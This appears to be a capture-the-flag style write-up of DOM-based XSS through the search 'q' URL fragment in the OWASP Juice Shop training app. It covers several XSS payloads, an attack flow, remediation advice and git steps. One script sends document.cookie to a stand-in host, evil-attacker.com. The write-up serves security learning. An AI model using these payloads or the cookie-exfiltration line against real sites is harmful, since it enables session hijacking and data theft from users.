Method 2 – URL Parameter Injection (DOM XSS) with deeper insight into methodology, payload anatomy, browser behavior, validation, and exploit impact:

markdown
Copy
Edit
# 🧠 Method 3 – URL Parameter Injection (DOM-Based Cross-Site Scripting)

This method leverages a reflected, unsanitized query parameter within the URL fragment to achieve DOM-based XSS in the OWASP Juice Shop application. Specifically, the application reads the `q` parameter from the URL and directly injects it into the DOM using an unsafe sink, such as `innerHTML`, without applying any context-aware sanitization. This makes it possible for an attacker to inject and execute arbitrary JavaScript in the victim’s browser — leading to client-side code execution, session hijacking, or cookie theft.

---

## 🔎 Attack Vector: `q` Parameter in URL Fragment

### Target URL Format:
```bash
http://localhost:3000/#/search?q=test
Observation:
When the q parameter is modified, its content is directly reflected into the page. This was verified via browser DevTools by searching for test in the Elements tab. The value is inserted directly into the HTML, exposing a clear DOM sink vulnerable to XSS.

Vulnerable Sink Identified:
innerHTML → No encoding or sanitization

Possibly rendered inside an Angular/JS template block

💣 Payload Arsenal: XSS Through Fragment Injection
Raw Payloads:
bash
Copy
Edit
http://localhost:3000/#/search?q=<script>alert(1)</script>
http://localhost:3000/#/search?q="><img src=x onerror=alert(1)>
http://localhost:3000/#/search?q="><svg/onload=alert(1)>
Encoded Payloads (URL-safe):
bash
Copy
Edit
http://localhost:3000/#/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
http://localhost:3000/#/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
🧬 Payload Anatomy & Technique
Context Manipulation: Breaks out of the current DOM structure using " >

Injection Point: Directly inside an unsanitized innerHTML or text binding

Execution Trigger: <script>, onload, or onerror triggers JS execution

No Backend Interaction: Entire attack is client-side, bypassing server-side filtering

⚙️ Step-by-Step Execution Flow
Attacker crafts a malicious URL with the payload injected into the q parameter.

Victim visits the link or clicks on a phishing/social-engineered lure.

Juice Shop processes the fragment (/#/search?q=...) in the browser.

Client-side code extracts q, inserts it into the DOM via innerHTML.

Malicious JS executes in the browser’s context (e.g., alert(1) or cookie theft).

The internal Juice Shop validator detects the DOM manipulation and marks the Bonus Payload challenge as solved.

✅ Indicators of Successful Exploitation
Browser Alert Popup: Immediate execution of alert(1) on page load.

DOM Reflection: Verified that payload is inserted directly into HTML.

Challenge Completion: "Bonus Payload Challenge" marked as solved on the Scoreboard.

Console Output: Optionally, document.location.href, document.cookie available via DevTools.

🔬 Optional: Enhanced Testing & Proof of Concept
Data Exfiltration Simulation:
html
Copy
Edit
<script>
  fetch('http://evil-attacker.com/log?cookie=' + document.cookie);
</script>
⚠️ Use only in isolated environments. This demonstrates real-world data exfiltration but must not be executed in public or shared networks.

📸 Evidence Collection
Screenshot captured with alert box and scoreboard visible.

Naming convention used: DOM-XSS-URL-Param-Payload.png

Screenshot Steps:
Trigger the payload (alert should appear).

Open Score Board (http://localhost:3000/#/score-board).

Capture both the alert and solved challenge banner.

Save screenshot to evidence folder.

🧠 Risk Analysis
Vector	Description
Vulnerability	DOM-Based XSS via URL Fragment
Impact	Arbitrary JS Execution in Victim’s Browser
CVSS Score	6.1 (Medium) – can escalate based on context
Exploitable By	Any user clicking a crafted URL
Consequences	Session Hijacking, Data Theft, CSRF Bypass, Defacement

🔐 Remediation Recommendations
Sanitize all reflected values before DOM insertion.

Use secure methods like textContent instead of innerHTML.

Implement client-side sanitization with libraries like DOMPurify.

Deploy strong Content Security Policy (CSP) headers to restrict script execution.

📁 Folder Structure
mathematica
Copy
Edit
OWASP-Juice-Shop-Bonus-Payload/
└── Method-2-URL-Param-Injection/
    ├── Read-Me-URL-Parameter.md
    ├── To-Do-URL-Parameter.md
    ├── payload.txt
    ├── DOM-XSS-URL-Param-Payload.png
🧾 GitOps & Version Control
bash
Copy
Edit
cd ~/juice-shop/OWASP-Juice-Shop-Bonus-Payload/Method-2-URL-Param-Injection

# Stage your changes
git add .

# Commit with detailed message
git commit -m "🔐 DOM-Based XSS via URL fragment injection – payloads, PoC, screenshot added"

# Push to remote
git push origin main
✅ Summary: What We Achieved
 Discovered a vulnerable query parameter

 Verified DOM reflection and lack of sanitization

 Crafted multiple working DOM-based XSS payloads

 Triggered client-side script execution via fragment

 Captured proof of execution and scoreboard result

 Structured and versioned exploit documentation

⚔️ Client-side vulnerabilities are just as dangerous as server-side — and often more subtle. DOM XSS thrives on overlooked frontend logic. Hunt it hard.
